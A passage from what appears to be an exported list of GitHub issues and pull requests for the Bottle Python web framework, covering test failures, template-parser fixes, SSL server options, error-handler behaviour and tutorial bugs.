&#039;exec&#039;)\n  File &quot;&lt;string&gt;&quot;, line 1\n    _printlist((u&#039;test &#039;, _escape(a}} {{b),))\n                                  ^\nSyntaxError: invalid syntax\n</pre>\n        </body>\n    </html>\n'

======================================================================
FAIL: test_template_opts (test_wsgi.TestRouteDecorator)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/test_wsgi.py"", line 254, in test_template_opts
    self.assertBody('test 5 6', '/test')
  File ""/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/test/tools.py"", line 98, in assertBody
    self.assertEqual(tob(body), self.urlopen(route, **kargs)['body'])
AssertionError: 'test 5 6' != '\n    <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">\n    <html>\n        <head>\n            <title>Error: 500 Internal Server Error</title>\n            <style type=""text/css"">\n              html {background-color: #eee; font-family: sans;}\n              body {background-color: #fff; border: 1px solid #ddd;\n                    padding: 15px; margin: 15px;}\n              pre {background-color: #eee; border: 1px solid #ddd; padding: 5px;}\n            </style>\n        </head>\n        <body>\n            <h1>Error: 500 Internal Server Error</h1>\n            <p>Sorry, the requested URL <tt>&#039;http://127.0.0.1/test&#039;</tt>\n               caused an error:</p>\n            <pre>Internal Server Error</pre>\n              <h2>Exception:</h2>\n              <pre>SyntaxError(&#039;invalid syntax&#039;, (&#039;&lt;string&gt;&#039;, 1, 31, &quot;_printlist((u&#039;test &#039;, _escape(a}} {{b),))\\n&quot;, 0))</pre>\n              <h2>Traceback:</h2>\n              <pre>Traceback (most recent call last):\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 862, in _handle\n    return route.call(**args)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 1732, in wrapper\n    rv = callback(*a, **ka)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3619, in wrapper\n    return template(tpl_name, **tplvars)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3595, in template\n    return TEMPLATES[tplid].render(kwargs)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3399, in render\n    self.execute(stdout, env)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3386, in execute\n    eval(self.co, env)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 189, in __get__\n    value = obj.__dict__[self.func.__name__] = self.func(obj)\n  File &quot;/mnt/gen2/TmpDir/portage/dev-python/bottle-0.12.8/work/bottle-0.12.8/bottle.py&quot;, line 3344, in co\n    return compile(self.code, self.filename or &#039;&lt;string&gt;&#039;, &#039;exec&#039;)\n  File &quot;&lt;string&gt;&quot;, line 1\n    _printlist((u&#039;test &#039;, _escape(a}} {{b),))\n                                  ^\nSyntaxError: invalid syntax\n</pre>\n        </body>\n    </html>\n'

----------------------------------------------------------------------
Ran 308 tests in 2.108s

FAILED (failures=3, errors=1)
```
## For pypy3, e.g.;

Ran 308 tests in 1.927s

OK

> > > ## Completed testing dev-python/bottle-0.12.8

There is a mass of 
<bottle.py:[various line numbers]: DeprecationWarning: >
but these are non fatal.
fwiw version of pypy is 2.3.1, however seeing it piggyback py2.7 and py2.7 passes fine I wonder what's going on here.
"
713,Allow for long result codes,2015-01-31T19:44:14Z,,,,,"When using Hy, all non-floats are implicitly longs, so I keep having to convert everything to int. This is a little fix for that.
"
712,custom error_handler doesn't have access to the original traceback object,2015-01-30T01:06:19Z,,,,,"I have a custom error_handler defined for certain status codes, and I need a way to access the original [traceback object](https://docs.python.org/2/library/types.html#types.TracebackType) in order to ship an accurate stacktrace to [airbrake.io](https://airbrake.io/) using their [python client](https://github.com/airbrake/airbrake-python). In the snippet below, the traceback object is **not** available thru `sys.exc_info()`, which returns `None, None, None` by this point. 

Slightly misleading is the `traceback` attribute attached to `error`:

https://github.com/bottlepy/bottle/blob/854fbd7f88aa2f809f54dd724aea7ecf918a3b6e/bottle.py#L1714

I would have imagined that it was the real traceback object, much like the `exception` attribute was the real Exception object. Instead, it is the formatted string returned by [traceback.format_exc()](https://docs.python.org/2/library/traceback.html#traceback.format_exc)

``` python
def error_formatter(error):
    ...
    # no way to access original traceback object here! :(

app = bottle.default_app()
app.error_handler = {
    501: error_formatter,
    500: error_formatter,
    400: error_formatter,
    401: error_formatter,
    403: error_formatter
}
...
```

There are numerous ways to grant the error_handler access to the original traceback object, but I'm not sure what the _best_ way would be. My local (temporary) fix is a slight modification to the [definition of `HTTPError`](https://github.com/bottlepy/bottle/blob/854fbd7f88aa2f809f54dd724aea7ecf918a3b6e/bottle.py#L1709-L1715):

``` python
class HTTPError(HTTPResponse):
    default_status = 500
    def __init__(self, status=None, body=None, exception=None, traceback=None,
                 **options):
        self.exc_info = sys.exc_info()  # added this line
        self.exception = exception
        self.traceback = traceback
        super(HTTPError, self).__init__(body, status, **options)
```

Now my error handler has access to the traceback object:

``` python
def error_formatter(error):
    ...
    trace = error.exc_info[2]
```

The traceback object is also a required argument for many of the functions in the [traceback module](https://docs.python.org/2/library/traceback.html), so having it available in a custom error handler should generally be useful.
"
711,Doc translate,2015-01-22T21:55:09Z,2015-03-24T13:50:57Z,,,,"Configuring environment to have documentation on multi-linguagens
"
710,Returned dictionary doesn't get properly serialized from error handlers,2015-01-22T14:00:56Z,,,,,"I've got the following code (using `bottle.py`@`854fbd7f88`):

```
from bottle import run, Bottle, abort

app = Bottle()

def message(msg, code):
    return {""message"": msg, ""code"": code}

@app.error(400)
def eh(error):
    return message(error.body, error.status_code)

@app.route(""/bad"", method=[""GET""])
def handler():
    abort(400)

@app.route(""/good"", method=[""GET""])
def handler():
    return message(""works ok"", 200)

run(app, host='localhost', port=8080)
```

I get different results when calling `/bad` and `/good`, as it can be seen below:

```
$ for i in bad good; do echo -n ""$i ==> ""; curl http://localhost:8080/$i ; echo;  done
bad ==> messagecode
good ==> {""message"": ""works ok"", ""code"": 200}
```

Any idea what's going on? 
"
709,"Add ""startup"" hook that is called on run()",2015-01-19T02:16:48Z,2016-06-04T02:21:40Z,"Request, Undecided",,,"The ""startup"" hook will be called whenever the application is run,
either using `Bottle.run()` or the package-level `run()` function.

In addition, added documentation for the ""config"" hook.
"
708,Added certfile option to WSGIRefServer to specify SSL,2015-01-18T05:39:41Z,2016-08-27T16:52:07Z,,,,"Changes to allow the use of SSL with WSGIRefServer by specifying a certificate file using the 'certfile' key in options.

Based on the example [here](http://www.piware.de/2011/01/creating-an-https-server-in-python/) and my blog post [here](http://www.socouldanyone.com/2014/01/bottle-with-ssl.html). The file specified should be in PEM format containing both private and public keys (it should be possible to add a separate private key too, but this is how I've been using it so far).
"
707,Add SSL/TLS support to TwistedServer,2015-01-15T22:18:05Z,2016-08-26T17:19:47Z,,,,"First I would like to apologize for any problems related to this pull request, as it is my first pull request on someone else's repository.

The idea here is to add SSL support to the TwistedServer ServerAdapter.

You can see in the comments everything I will say below, but for the sake of completeness:

I try to stick to your conventions as close as possible (I cannot fix the spaces in CherryPyServer that my text editor [NinjaIDE] added). I used a method similar to the one in CherryPyServer to test for certfile and keyfile, and depending on whether they were passed I use the method described [here](http://twistedmatrix.com/documents/12.3.0/core/howto/ssl.html) to have the reactor listenSSL or to listenTCP as the original implementation did.

Please let me know if this pull request adheres to your standards and if not how I can improve for next time. Thank you for your time and consideration.
"
706,auth_basic doesn't allow unauthorized users,2015-01-12T09:43:59Z,,,,,"I am not really sure that this is a bug, but [@auth_basic()](https://github.com/bottlepy/bottle/blob/master/bottle.py#L2573) decorator doesn't allow unauthorized users even in case, that authorization function say that it is okay.

The ""problem"" is in line with condition, which checks existence of username before it checks the autorization function `check()`.

``` python
if user is None or not check(user, password):
```

I believe, that it should only check the authorization function, because otherwise you can't have routes that are accessible to all, but they still have `@auth_basic()` decorator. This may be quite annoying while debugging your authorization function and also there are some use-cases when you do something more advanced in your authorization function, like different access levels for each path and so on.

Tl dr; I think that user's authorization function should choose whether to authorize or reject user, not the presence of `@auth_basic()` decorator itself.
"
705,remove validate function on ToDo list tutorial,2015-01-11T17:59:48Z,2015-01-22T15:30:12Z,,,,"Validate function no longer exists!

Issues that reports use the validate:
#531
#704
"
704,Error : Tutorial: validate in Todo-List Application,2015-01-11T13:17:20Z,,,ImportError,ImportError: cannot import name validate,"Dear all,

I cannot get the validate code in the tutorial code to work:

shell> python todo.py 
Traceback (most recent call last):
  File ""todo.py"", line 2, in <module>
    from bottle import route, run, debug, template, request, validate, static_file, error
ImportError: cannot import name validate

However, the rest of the code works fine after just deleting the two references to validate...
Is this just a versioning issue?
"
703,File handles leak when using Bottle.mount() and uWSGI,2015-01-11T03:18:49Z,2015-12-17T15:32:23Z,,,,"This is a pretty subtle bug; and I've produced a detailed write-up at http://trvrm.github.io/seriously-subtle-bug.html.

In brief, using `static_file` in routes served via `Bottle.mount()` in a uWSGI environment causes file handles to leak.  The underlying reason is that https://github.com/bottlepy/bottle/blob/master/bottle.py#L914 is called twice, `_cast()` is called recursively when used with bottle.mount().

This isn't a problem with WSGIRefServer, but under uWSGI 

`request.environ['wsgi.file_wrapper']` is mapped to `py_uwsgi_sendfile`

(https://github.com/unbit/uwsgi/blob/ed2ca5d33325dc925f6fc5558d0b817447327049/plugins/python/wsgi_handlers.c#L463)

which appears to increment the refcount too many times if it's called more than once.

I don't know if this is a bug with Bottle, uWSGI, or with the WSGI standard, because I'm not sure what `wsgi.file_wrapper` is meant to achieve.
"
702,fixes issue #671,2015-01-11T02:20:22Z,,,,,"I'm quite new to Bottle but I've tried to look into this. At [line 861](https://github.com/bottlepy/bottle/blob/master/bottle.py#L861) we get the output of our selected route call. The returned object of `route.call` doesn't update the global `response` object and so when we go into the `finally` block we're dealing with an out of date response.

Furthermore, in case of a 404, we never get to `route.call` and immediately go into the `except HTTPResponse` which also never updates the global response object and so the finally block will get the wrong result.

This updating is done by the `out.apply(response)` method which is called in the `_cast()` method. Unfortunately this is too late because the `after_request` has already been processed.

I don't really know if this is a good solution but I think I've fixed it by creating an `out` variable which gets the updated response object, use the `apply` method in an outer finally block and only then triggering the hook.

Not sure if this is hackish or ugly, but I'm not used to contributing so any feedback would be great.
"
701,fix typo in the Route class docstring,2015-01-10T19:26:36Z,,,,,
700,Bottle fails with GeventServer with chunked POST request,2015-01-08T09:48:40Z,,"Bug, Request",,,"When POSTing a chunked request to the gevent enabled bottle server, the server will return with an 400 error. The server is run like:

```
run(server=""gevent"")
```

With some time of debugging, it turns out that Bottle tries to parse the (assuming chunked) body again after gevent's pywsgi server already parsed the chunked body. Bottle has no problem with the built-in wsgiref server on chunked upload.

I'm not sure if this is a Bottle problem or gevent problem. Should we remove the Transfer-Encoding header in pywsgi? Or should we try to detect that the body has been parsed already and try not to parse again?
"
699,"Remove unused parameter from the ""depr"" function.",2015-01-07T18:19:52Z,2016-08-27T17:03:14Z,,,,"Tried to dig in the commits for a reason for this parameter but couldn't find any. It was once introduced as ""hard"" with no explanation and then changed to ""strict"". It never served a purpose as far as I can see.
"
698,"Mishandling JSON data in Python3, but not Python2",2015-01-06T08:55:26Z,2015-01-07T14:21:26Z,,,,"I've got a bottle-based HTTP server that mostly shuffles JSON data around. When I run this in Python 2.7 it works perfectly, and in my route handlers I can access the JSON data via bottle.request.json. However, when I run it under Python 3.4 bottle.json.request is None.

I've examined the HTTP traffic, and in both cases it is exactly the same (as would expected since that's under control of the non-Python-dependent client.)

I also see that the JSON data is reaching bottle in both cases. If I print out bottle.request.params.keys(), I see the string-ified JSON as the only entry in the list in both cases. And the strings are identical in both cases. For some reason, however, the Python 2 version is recognizing the JSON data while the Python 3 version isn't.

Strangely, this used to work, but some recent change either in my code or bottle (or both) has broken things. Looking over my code, though, I can't see what I might have done to create the problem, so I can only assume it's a problem with bottle and/or its interaction with Python3. 
"
697,Replace % by format in string formatting pep 3101,2015-01-04T23:38:23Z,2015-01-05T00:58:50Z,,,,"It is recommended to use format **pep 3101**[1]!
What do you think of change in core bottle?

[1] https://www.python.org/dev/peps/pep-3101/
"
696,Updated docs,2015-01-04T16:34:02Z,2016-08-27T15:12:43Z,,,,
695,Tidied version of #566,2014-12-30T22:53:20Z,2016-08-29T17:28:45Z,,,,"#566
"
694,"Invoke .__html__(), if present, from _escape",2014-12-27T04:57:34Z,2014-12-28T22:22:59Z,,,,"Allowing custom escaping of objects that ""know what they're doing"", so instead of `{{! myobj.htmlify() }}`, it's `{{ myobj }}`.

Thoughts?
"
693,Stpl less slicing,2014-12-27T04:52:49Z,2015-01-01T15:34:22Z,,,,"Here's another one dependant on #690

The regexes claimed to match ""start of line"" when in fact, they did not.By using `.search(s, pos=p)` over `.search(s[p:])`, this now works correctly. This allows the special casing of ternary if to be removed.

The previous regex would allow `% if True: foo() end`, the new one requires `% if True: foo(); end`, which seems to be what the old regex intended anyway. 
"
692,Stpl line continuation fix,2014-12-27T00:36:24Z,2014-12-30T21:44:05Z,,,,"Follow up of https://github.com/bottlepy/bottle/issues/690

Line continuation characters were not processed, leading to a syntax error in the rare case of:

``` python
% a = 1 \
% if False else 2
```
"
691,STPL - Be more lenient on newlines,2014-12-26T23:32:47Z,2014-12-28T22:29:19Z,,,,"Proposal - allow newlines anywhere they are allowed mid-""line"" in standard python:
## In single lines:

None of these produce any non-whitespace output

``` python
% a = 123 \
      + 456   # no % required here, since we're continuing the previous line

% b = (123
      + 456)  # as above

% c = [1,
          2,
          3]

% d = [i
          for i in range(4)]
```
## In expressions:

``` python
{{ ', '.join(
    word
    for word in ['hello', 'world']
) }}

{{ 1 \
    + 2 }}
```
"
690,Stpl comprehensions,2014-12-26T23:25:13Z,2014-12-29T20:05:47Z,,,,"Fixes the parser to allow this code to render:

``` python
% a = [
%    (i + 1)
%    for i in range(5)
%    if i%2 == 0
% ]
```

This was written on top of the cleanup in https://github.com/bottlepy/bottle/pull/689
"
689,Clean up STPL voodoo,2014-12-21T19:00:40Z,2014-12-29T20:05:48Z,,,,"Rewritten to use:
- Raw strings
- Triple-quoted strings
- Verbose regex mode `(?x)`

Also includes a fix changing `[urbURB]?` to `[urbURB]*` to match `ur'test'`
"
688,Support multiple character encodings in HTTP header,2014-12-21T08:00:29Z,,,,,
687,Gunicorn don't mount routes,2014-12-18T15:56:55Z,2014-12-29T14:16:08Z,,,,"I am trying to run an app with gunicorn, all is working fine except routes loaded with app.mount that return a 404 status code.

With other servers, like paste and cherrypy, all is fine.

I am using bottle 0.12.7 and gunicorn 19.1.1
"
686,static_file mime type for woff fonts,2014-12-15T01:37:47Z,2014-12-28T22:41:33Z,,,,"Console says to me several times a day: Resource interpreted as Font but transferred with MIME type text/html: "".../bootstrap/dist/fonts/glyphicons-halflings-regular.woff"".
I using function static_file
"
685,Update CherryPy SSL to use latest API and work on Py3,2014-11-30T07:50:04Z,2017-03-25T18:13:33Z,,,,"On Py2, the `ssl_certificate` and `ssl_private_key` attributes are deprecated, and on Py3 they don't exist at all!

This PR just updates the code to use BottlePy's recommended `ssl_adapter` method, fixing it for Python3.

That said, I haven't actually been able to get this to work with Py2. Neither this nor the previous version work on Python2 for me, and they both result in a non-ssl server, but I suspect that's a CherryPy issue with my particular environment. Mind trying this out with a Py2 server on your own box before pulling it? I've got some test server code [here](https://gist.github.com/DanielOaks/d99607ffda205d6664e2)
"
684,process to control the framework evolution (Create changelog file and milestones),2014-11-29T16:58:47Z,2014-12-29T00:29:01Z,,,,"We need to create a process to control the evolution of the new versions of the bottle!

With a changelog file know what has been done in this version being developed and when leaving the release we managed to launch the project evolution (a blog post for example).

Improve the story that we will implement in the next release of the bottle (use better the milestones).

Bug in his branch master needs (obligatorily) go to the previous release. Example, to correct an error in the template engine of 0.13-dev need take this correction to 0.12.
With that we come in another subject, how long we will support the old version (0.11 today)?
"
683,Fix end-of-code-block template token regex,2014-11-28T15:56:18Z,2014-11-29T16:46:32Z,,SyntaxError,SyntaxError: invalid syntax,"If end-of-code-block template token (`%>`) is followed by a Windows-style newline (`\r\n`), bottle will report `SyntaxError: invalid syntax`. 

Example:

``` python
>>> tpl = '<%\r\nprint(""hello"")\r\n%>\r\nworld'
>>> bottle.template(tpl)
```

Output:

```
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""bottle.py"", line 3494, in template
    return TEMPLATES[tplid].render(kwargs)
  File ""bottle.py"", line 3320, in render
    self.execute(stdout, env)
  File ""bottle.py"", line 3307, in execute
    eval(self.co, env)
  File ""bottle.py"", line 205, in __get__
    value = obj.__dict__[self.func.__name__] = self.func(obj)
  File ""bottle.py"", line 3271, in co
    return compile(self.code, self.filename or '<string>', 'exec')
  File ""<string>"", line 3
    %>
    ^
SyntaxError: invalid syntax
```

Output after fix:

```
hello
'world'
```

Took me a while to catch that bug as it didn't manifest if end-of-code-block is not followed by a newline (i.e. file ends immediately after `'%>'`).
"
682,Added travis image build status,2014-11-27T22:16:58Z,2014-11-28T14:02:29Z,,,,
681,fix status code 413 description as RFC2616,2014-11-27T18:55:50Z,2014-11-27T19:48:48Z,,,,"10.4.14 413 Request Entity Too Large ............................69
https://www.ietf.org/rfc/rfc2616.txt
"
680,fix status code 413 description as RFC2616,2014-11-27T04:48:27Z,2014-11-27T18:53:44Z,,,,"   10.4.14   413 Request Entity Too Large ............................69
https://www.ietf.org/rfc/rfc2616.txt
"
679,fix typo tutorial grammatical corrections,2014-11-27T04:44:16Z,2014-11-27T17:58:00Z,,,,
678,Nested Bottle app with Waitress,2014-11-21T20:54:52Z,2015-06-14T16:58:08Z,,,,"I am building a web application using nested Bottle apps and I'm having problems returning a static file from the nested app when running the site through the Waitress web server.  It works fine when run with WSGIRefServer.

Sample app that replicates the issue below (browse to `/test/`).  If I run the app using WSGIRefServer (commented run command) then the javascript file downloads fine.  If i use `server=""waitress""` then /test/js returns a blank response (no errors).

``` python
from bottle import Bottle, run, static_file

baseapp = Bottle()
app = Bottle()
baseapp.mount(""/test/"", app)

@app.get(""/"")
def index():
    return """"""<!DOCTYPE html>
<html><body>
<p>Result: <span id=""asdf"">Failed :(</span></p>
<script src=""js""></script>
</body></html>
""""""

@app.get(""/js"")
def js():
    return static_file(""test.js"", ""./"")

run(app = baseapp, server=""waitress"", url=""0.0.0.0"", port=8080)
#run(app = baseapp, url=""0.0.0.0"", port=8080)
```

Contents of test.js:

``` javascript
document.getElementById('asdf').innerHTML = 'Worked! :)';
```

I'm running Python 3.4.2 with Bottle 0.12.7 and Waitress 0.8.9. (downloaded via pip).
"
677,fixed typo in doc,2014-11-20T16:41:55Z,2014-11-27T18:05:43Z,,,,
676,POST request with Content-Encoding: gzip,2014-11-18T12:15:18Z,2014-12-28T22:53:55Z,,,,"While it is not recommended but exists in realworld, sometime we want to process request POST where body is gzipped (e.g. lot of JSON data).

It seems that it is a bit complicated to implement responses Content-Encoding in Bottle (and I totally agree), it should be easier for request. I tried to find a WSGI middleware or even using Nginx, but it seems that it is not possible to uncompress body before forwarding request to Bottle.

For that reason, it looks reasonable to implement that in bottle itself. Currently, I'm doing it with a hook. It is working, but not very clean. 

```
def uncompress_request_body():
    encoding = request.headers.get(""content-encoding"")
    if encoding:
        if encoding == ""gzip"":
            try:
                import StringIO
                import gzip
                bodygz = StringIO.StringIO(request.body.read())
                g = gzip.GzipFile(fileobj=bodygz)
                body = g.read()
                g.close()
                request.environ['bottle.request.body'] = StringIO.StringIO(body)
                request.environ['CONTENT_LENGTH'] = len(body)
                del request.environ['HTTP_CONTENT_ENCODING']
            except:
                logging.exception(""cannot ungzip request"")
                raise HTTPError(400, ""Bad request"")
        else:
            raise HTTPError(400, ""Bad request"")
```

```
app.add_hook(""before_request"", uncompress_request_body)
```

Have you an advice on that or do you think it is worth to implement that directly in bottle ?
"
675,PEP8 Compliant Code ,2014-11-16T09:22:01Z,2016-08-28T18:10:26Z,,,,"PEP8 issues have been fixed across all files. Code is more pythonic and readable now!
"
674,Error in template on upgrade,2014-11-11T18:08:12Z,,Needs Documentation,IndentationError,IndentationError: unexpected indent,"I got the following error on changing from 11.6 to 12.7 on a template that used to work ok:

```
  File ""/home/fp/Pruebas/tabi.tpl"", line 23
    if len(row[0])==1:
   ^
IndentationError: unexpected indent
```

The piece of code is:

```
...
        %if i==len(row)-1 and i < mxr-1: xx=mxr - i; cspan = ' colspan=""' + str(xx) + '""'
        %else: cspan=''
        %if len(row[0])==1:
          %if i==len(row)-1:
...
```

I reverted to bottle 11.6 and it works ok.
"
673,"Get mime type from download, if download is a file name",2014-11-07T17:50:49Z,2014-11-27T18:06:34Z,,,,"Get mime type from the download parameter instead of from the file, if
download is a file name. (added test for this too)

Use case: This helps when files are stored on disk as e.g. ""4"", ""36"" or ""6d2fb3bfe024805b692280b65f9636ad"" (as blobs basically for a database). The file name with suffix would then typically be taken from metadata in a database and added to the download with the download parameter.
"
672,add aiohttp support,2014-11-06T06:20:18Z,2015-02-10T06:53:38Z,,,,"As #641 mentioned
"
671,`after_request` won't reflect the out going response on error,2014-11-05T04:36:26Z,2015-10-31T23:12:38Z,,,,"Simple test code:

``` .Python
import bottle as bt

@bt.hook('after_request')
def log_request_a():
    print 'resp to: %s, %s' % (bt.request.remote_addr,
                                       bt.response.status_line)

@bt.get('/')
def _get():
    print 'return 400'
    bt.abort(400, 'test')

bt.run(server='cherrypy', host='localhost',  port=1888)
```

It will always print `resp to: 127.0.0.1, 200 OK` , not 400.
"
670,Make `root='/'` work cross-platform,2014-11-03T17:57:26Z,2016-04-09T09:40:36Z,,,,"If `root` already ends in `os.sep`, don't add another one

This used to fail on windows, but somehow worked on unix
"
669,typo fix,2014-10-31T17:58:45Z,2014-11-27T18:07:41Z,,,,
668,"Fix the Allow: header value in 405 ""Method not allowed."" response.",2014-10-31T16:31:10Z,2017-08-16T07:45:44Z,,,,
667,"typo ""to handy""",2014-10-15T21:15:47Z,2014-10-22T20:14:27Z,,,,"""This is just to handy"" -> ""This is just too handy""
"
666,Update to new rule syntax,2014-10-07T18:37:56Z,2014-10-22T20:15:03Z,,,,
665,"ResourceWarning: unclosed file ""BufferedRandom"" appear randomly",2014-09-29T22:13:40Z,,,,,"Hi,
I'm running latest bottle version from github (today) with default engine and python 3.4.1.
Sometime, I got this weird message (memory leak?) on console output :   

```
.../dev/lib/python3.4/site-packages/bottle.py:1661: ResourceWarning: unclosed file <_io.BufferedRandom name=6>
  def fset(_, value): ls.var = value
```

Let me know if you need anything else.
Thanks
"
664,Add possibility to add headers to all outgoing error responses,2014-09-25T07:54:55Z,,Bug,,,"It would be super-helpful if Bottle allowed me to add headers on all outgoing responses - including 404s. 

I can do this on normal 200-responses using the after_request hook, as the response is ready in bottle.response when these are called, but when this hook is called on 404-error requests, the response is not ready yet (at least its status code is not 404), and any headers that I try to set are apparently dropped.

My use case is a REST endpoint that serves ajax calls from browsers, and I need to set the Access-Control-Allow-Origin header. I have done so according to the recipe at http://bottlepy.org/docs/dev/recipes.html#using-the-hooks-plugin , but it does not work for 404s and 500s. The consequence is that the consuming web app has no way of detecting what has gone wrong.
"
663,Plugins are inconsistently applied to @app.error handlers,2014-09-23T21:20:28Z,2014-12-28T23:38:46Z,,,,"Let's say I have this plugin:

``` python
@app.install
def myplugin(callback):
    def wrapper(*args, **kwargs):
        request.myvalue = True  # actually, some function of session data

        try:
            return callback(*args, **kwargs)
        finally:
            request.myvalue = False

    return wrapper
```

There are 3 scenarios here:
1. **No matching route**
   
    Plugin never executes
    In error handler, `request.myvalue` throws an attribute error
2. **Route matches, raises HTTPError**
   
   Plugin executes, cleanup hit before error handler invoked
   In error handler, `request.myvalue == False`
3. **Route matches, no error**
   
   In route handler, `request.myvalue == True`

I would like `request.myvalue == True` in all three cases.

Can I schedule cleanup to occur after the error handler has executed?
Can plugins be made to run even if no route matches?
"
662,Fix typo,2014-09-23T20:41:46Z,2014-10-22T20:15:18Z,,,,
661,Bottle fails to start with reloader=True when using absolute import,2014-09-23T08:36:23Z,,,ImportError,ImportError: No module named config,"I'm using bottle v0.12.7 and I have the following project structure:

```
test
├── api
│   ├── hello.py
│   └── __init__.py
├── config
│   ├── config.py
│   └── __init__.py
└── __init__.py
```

The hello.py file is:

``` python
import sys
import bottle
from test.config import config

@bottle.post('/hello')
def hello():
    return config.MESSAGE

def main(argv):
    app = bottle.Bottle()
    reloader = '--reloader' in argv
    print('Starting with reloader={}'.format(reloader))
    app.run(host='0.0.0.0', port=8080, debug=True, reloader=reloader)

if __name__ == '__main__':
    main(sys.argv)
```

and the config.py is simply

``` python
MESSAGE = 'Hello!'
```

When I run `api.py` with `reloader=False` (`python -m test.api.hello`) the api starts correctly. If I run it with `reloader=True` (`python -m test.api.hello --reloader`) it fails with:

```
Starting with reloader=True
Traceback (most recent call last):
  File ""/home/kostas/Code/Python/test/test/api/hello.py"", line 3, in <module>
    from test.config import config
ImportError: No module named config
```
"
660,Addresses #659.,2014-09-18T04:40:49Z,2014-10-22T20:16:16Z,,,,
659,Template function defined() doesn't work with dictionaries?,2014-09-17T21:17:55Z,,,,,"I'm running 0.12.7 and have hit a problem. I'm wondering if anyone can explain why the following code doesn't work if my_dict['id'] is defined in the current template:

```
% if defined(my_dict['id']):
    <input type=""hidden"" name=""id"" value=""{{my_dict['id']}}"" />
% end    
```

defined() is not returning True. I have confirmed that my_dict['id'] is getting passed to my template because I can output it in textfields in my form. If I replace my_dict['id'] with the name of a string variable, defined() does return True and the HTML is rendered as expected.

Possible bug, working as designed, or am I misunderstanding something?
"
658,fix coverage break gevent/eventlet testcase,2014-09-16T03:40:37Z,2014-10-22T20:16:50Z,,AssertionError,"AssertionError: Exception KeyError: KeyError(139741601585264,) in <module 'threading' from '/usr/lib/python2.7/threading.pyc'> ignored","The coverage.process_starup() will import threading which breaks gevent/eventlet monkey patch

Before the patch

```
python test/test_server.py
WARNING: Skipping 'meinheld' test (ImportError).
.WARNING: Skipping 'bjoern' test (ImportError).
.WARNING: Skipping 'cherrypy' test (ImportError).
.WARNING: Skipping 'diesel' test (ImportError).
..WARNING: Skipping 'fapws3' test (ImportError).
.E..WARNING: Skipping 'rocket' test (ImportError).
....
======================================================================
ERROR: test_simple (__main__.TestGeventServer)
Test a simple static page with this server adapter.
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""test/test_server.py"", line 79, in tearDown
    raise AssertionError(line.strip().decode('utf8'))
AssertionError: Exception KeyError: KeyError(139741601585264,) in <module 'threading' from '/usr/lib/python2.7/threading.pyc'> ignored

----------------------------------------------------------------------
Ran 13 tests in 6.463s

FAILED (errors=1)
```

After this PR

```
python test/test_server.py
WARNING: Skipping 'meinheld' test (ImportError).
.WARNING: Skipping 'bjoern' test (ImportError).
.WARNING: Skipping 'cherrypy' test (ImportError).
.WARNING: Skipping 'diesel' test (ImportError).
..WARNING: Skipping 'fapws3' test (ImportError).
....WARNING: Skipping 'rocket' test (ImportError).
....
----------------------------------------------------------------------
Ran 13 tests in 6.463s

OK
```
"
657,"fix ""Request to Large"" typo",2014-09-15T02:39:26Z,2014-09-15T11:12:30Z,,,,"trival PR
"
656,Bottle.py cookie httponly flag not working,2014-09-14T22:50:29Z,,,,,"i'm trying to set bottle.py's cookie **httponly** flag but it isn't working (not showing).

from bottle.py API:

> The Response.set_cookie() method accepts a number of additional
> keyword arguments that control the cookies lifetime and behavior. Some
> of the most common settings are described here:
> 
> max_age: Maximum age in seconds. (default: None) expires: A datetime
> object or UNIX timestamp. (default: None) 
> 
> domain: The domain that is allowed to read the cookie. (default:
> current domain) 
> 
> path: Limit the cookie to a given path (default: /) secure: Limit the
> cookie to HTTPS connections (default: off).
> 
> **httponly: Prevent client-side javascript to read this cookie (default: off, requires Python 2.6 or newer).**

so i'm running Python 2.7 and i have tried to set it in the following correct way:

```
response.set_cookie(""sessie"", sessieid, path='/', httponly=True)
```

 but it doesn't work work. **httponly** section is empty and exported cookie looks like this:

```
127.0.0.1   FALSE   /   FALSE   sessie  bdf7KKRzxRQ5mYU6DN2xD
```

i can't straight my head here. what i'm doing wrong?

i get it to work fine when i set the cookie while firing a **GET** request but not if i fire a **POST** request. does **httponly** only works while set during **GET** requests so far?

for example the following doesn't work: 

```
if request.method == ""POST"": 
    response.set_cookie(""sessie"", sessieid, path='/', httponly=True) 
    do_something()
```

while the following does: 

```
response.set_cookie(""sessie"", sessieid, path='/', httponly=True)
if request.method == ""POST"": 
    do_something() 
```
"
655,Error : Tutorial: Todo-List Application,2014-09-12T05:38:58Z,,,sqlite3.ProgrammingError,"sqlite3.ProgrammingError: Incorrect number of bindings supplied. The current statement uses 1, and the","In @route('/edit/:no', method='GET')
...
 c.execute(""SELECT task FROM todo WHERE id LIKE ?"", (str(no)))

will show this:
sqlite3.ProgrammingError: Incorrect number of bindings supplied. The current statement uses 1, and the
re are 2 supplied. 

From google,the correct is :
 c.execute(""SELECT task FROM todo WHERE id = ?"", (no,))
"
654,Request with invalid JSON throws a 500,2014-09-11T01:10:46Z,2015-10-11T18:52:46Z,,,,"Currently, when a request with invalid JSON is sent to the server it causes a `JSONDecodeError` to be thrown by the underlying parser (simplejson in this case).

Bottle should catch and re-throw a 400 Bad Request `HTTPError` to indicated the the client that something is wrong with the request.
"
653,deferred.defer() does not work when server is started with bottle.run(),2014-09-05T19:24:31Z,,,,,"if bottle is run with `run(server='gae')` then trying to call `google.appengine.ext.deferred.defer()` will result in:

```
